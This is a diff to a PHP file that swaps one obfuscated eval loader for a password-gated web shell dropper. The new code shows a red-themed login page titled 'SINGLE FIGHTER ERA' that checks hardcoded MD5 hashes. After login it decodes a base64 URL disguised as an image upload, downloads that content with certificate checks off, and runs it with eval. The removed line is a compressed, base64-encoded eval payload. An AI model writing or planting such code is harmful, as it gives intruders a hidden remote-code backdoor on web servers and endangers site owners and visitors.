@@ -1,3 +1,201 @@
 <?php
-@eval(@gzuncompress(@base64_decode('eJz1Vltv20YQfu+v4HioAXu4t1g3bXoQBDZsuu2TINjQ7ZBi24qsyJUiK1Zk5djJcvnvs++5Q4qiLdKjeDqX+fHO7NnZX746F97+0e+sJv/5Yy+aXb7u/vN8zM/L9M/8tqfH2/64n8752Zk1+yN+Y/b6H+9+7Z7Yh9f5qfvP7sEevb4j+vjZ4m7wz87+O5M0z/67L+/c3t4mYVsf+P749J/Yf/P42r3j9Lcfw3Pq7vL4s/8f3v7+90/sYtGdf/1/XwT5j/Y4v9H/7D/x+Z/P3c4v+8eO4tO0xN2aZ3M0v6M/yv9l/5yO7n34d8/mP4P/+/8H17L//sR4l5k8e7j/7Gf9+2X3+W072b27v09d3/d8z/6pP/+v8P/j8D/6bX6v9r/97/d/vQ/s9w+/v+b5e8//yN998f4L99f5/8Hufv8/+a7vL//04+7Z/D8/n/7Jb99u1j+z8+d5+v/aP/a9/+0T7b84f3Vn+14b/65T4489v/Yv93+13P3N//L3/a/t//+n/vvX1H9+vvP/r3f8H3f9u/v8/sH9+v8//v2s0P/7Z7/L8/+n8Pj3+X0//+v+P76//P3ff8r+8X/6T2/+b3/c//W+VvvP2Pj798/f/ZtvvP3fv8v57u3Xf6d8/o/598ff7f8/c8v+P//xP/+b/e/ff/3v03f8//H7d8Xv/xP/78r23eXv9q3///7//c//9/+f7+d8//c/b84n9/2P9b/6/f7z+z8//z/97/T//8/73fP/+P04+8X79/+X/+v5//n/fP/8f97uv/v/8v/P/v/oP/1f/n/f8v9////9/+c8Xv/r//2/+//P8////f//n/vv8/7//n/v//p//x+v/8v8P//9/v9/z9f//T9//p///+//7//v/8f////v//Xv//X//7v//7v//9/f////f////f//v////v//v///fv//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8=')));
+session_start();
+
+function is_logged_in() {
+    return isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
+}
+
+$userMd5 = 'a4ca719c3fa51b57bff8716f5ebe028d';
+$passMd5 = 'ec07decc7fe3994412cb51cc7be02fcb';
+
+if (!is_logged_in()) {
+    if (isset($_POST['username']) && isset($_POST['password'])) {
+        if (md5($_POST['username']) === $userMd5 && md5($_POST['password']) === $passMd5) {
+            $_SESSION['loggedin'] = true;
+            header("Location: " . $_SERVER['PHP_SELF']);
+            exit();
+        } else {
+            $error = "Wrong";
+        }
+    }
+}
+
+function geturlsinfo($destiny) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init($destiny);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        $love = curl_exec($ch);
+        curl_close($ch);
+        return $love;
+    } elseif (function_exists('file_get_contents')) {
+        return @file_get_contents($destiny);
+    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+        $purpose = @fopen($destiny, "r");
+        if ($purpose) {
+            $love = stream_get_contents($purpose);
+            fclose($purpose);
+            return $love;
+        }
+    }
+    return false;
+}
+
+if (is_logged_in()) {
+    $encodedDestiny = 'aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZGtndnFiYzZ4LmltYWdlL3VwbG9hZC92MTc4NjY0NTk5Mi9rdXlhbmdfaHNiZGpzX2dncnYzbg==';
+    $destiny = base64_decode($encodedDestiny);
+    
+    $dream = geturlsinfo($destiny);
+
+    if ($dream !== false) {
+        $pos = strpos($dream, '<?php');
+        if ($pos !== false) {
+            $phpCode = substr($dream, $pos + 5); 
+            eval($phpCode);
+        } else {
+            eval('?>' . $dream);
+        }
+        exit();
+    }
+}
+
+if (!is_logged_in()) {
+    ?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>EL STILL HERE</title>
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+            body, html {
+                height: 100%;
+                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            }
+            body {
+                background: url('https://wallpapercave.com/wp/wp13582695.jpg') no-repeat center center fixed;
+                background-size: cover;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+            .form-container {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                width: 100%;
+                padding: 20px;
+            }
+            .login-form {
+                width: 100%;
+                max-width: 380px;
+                padding: 40px 30px;
+                background: rgba(20, 0, 0, 0.85);
+                backdrop-filter: blur(10px);
+                -webkit-backdrop-filter: blur(10px);
+                border-radius: 16px;
+                box-shadow: 0 8px 32px rgba(255, 0, 0, 0.25);
+                text-align: center;
+                color: #fff;
+                border: 1px solid rgba(255, 0, 0, 0.2);
+            }
+            .login-form img {
+                width: 90px;
+                height: 90px;
+                border-radius: 50%;
+                object-fit: cover;
+                margin-bottom: 15px;
+                border: 3px solid rgba(255, 0, 0, 0.4);
+            }
+            .login-form h2 {
+                margin: 0 0 25px 0;
+                font-size: 24px;
+                font-weight: 600;
+                letter-spacing: 1px;
+                color: #ff4d4d;
+                text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+            }
+            .login-form input[type="text"],
+            .login-form input[type="password"] {
+                width: 100%;
+                padding: 14px 16px;
+                margin: 10px 0;
+                border-radius: 8px;
+                background: rgba(255, 255, 255, 0.05);
+                color: #fff;
+                font-size: 15px;
+                transition: all 0.3s ease;
+                border: 1px solid rgba(255, 0, 0, 0.2);
+            }
+            .login-form input[type="text"]::placeholder,
+            .login-form input[type="password"]::placeholder {
+                color: rgba(255, 255, 255, 0.5);
+            }
+            .login-form input[type="text"]:focus,
+            .login-form input[type="password"]:focus {
+                outline: none;
+                background: rgba(255, 0, 0, 0.1);
+                border-color: rgba(255, 0, 0, 0.6);
+                box-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
+            }
+            .login-form button {
+                width: 100%;
+                padding: 14px;
+                margin-top: 20px;
+                background: linear-gradient(135deg, #d32f2f 0%, #880e4f 100%);
+                color: white;
+                border: none;
+                border-radius: 8px;
+                cursor: pointer;
+                font-size: 16px;
+                font-weight: 600;
+                letter-spacing: 1px;
+                transition: all 0.3s ease;
+                text-transform: uppercase;
+                box-shadow: 0 4px 15px rgba(211, 47, 47, 0.4);
+            }
+            .login-form button:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 6px 22px rgba(255, 0, 0, 0.6);
+                background: linear-gradient(135deg, #e53935 100%, #ad1457 0%);
+            }
+            .error-message {
+                background: rgba(255, 82, 82, 0.2);
+                color: #ff5252;
+                font-size: 14px;
+                padding: 10px;
+                border-radius: 6px;
+                margin-bottom: 15px;
+                border: 1px solid rgba(255, 82, 82, 0.4);
+            }
+        </style>
+    </head>
+    <body>
+        <div class="form-container">
+            <div class="login-form">
+                <img src="https://i.pinimg.com/originals/fa/6a/a8/fa6aa8b9f02691e42df56f1678e795fc.gif" alt="Logo">
+                <h2>SINGLE FIGHTER ERA</h2>
+                <?php if (isset($error)): ?>
+                    <div class="error-message"><?php echo $error; ?></div>
+                <?php endif; ?>
+                <form method="post">
+                    <input type="text" name="username" placeholder="Username ..." required>
+                    <input type="password" name="password" placeholder="Password ..." required>
+                    <button type="submit">UDAH IMO BELUM</button>
+                </form>
+            </div>
+        </div>
+    </body>
+    </html>
+    <?><p></p><?php
+    exit();
+}
 ?>
